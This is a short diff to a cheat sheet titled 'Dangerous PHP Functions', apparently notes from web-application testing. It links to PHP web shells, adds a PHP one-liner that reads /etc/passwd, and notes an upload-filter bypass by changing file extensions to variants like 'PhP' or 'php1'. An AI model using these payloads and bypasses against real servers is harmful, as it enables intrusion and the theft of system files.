@@ -9,3 +9,10 @@ Dangerous PHP Functions
 https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720
 
 https://github.com/flozz/p0wny-shell
+
+https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/PHP/obfuscated-phpshell.php
+
+<?php echo file_get_contents("/etc/passwd"); ?>
+
+exfiltrate: unauthorized access
+change extension to PhP, php1...
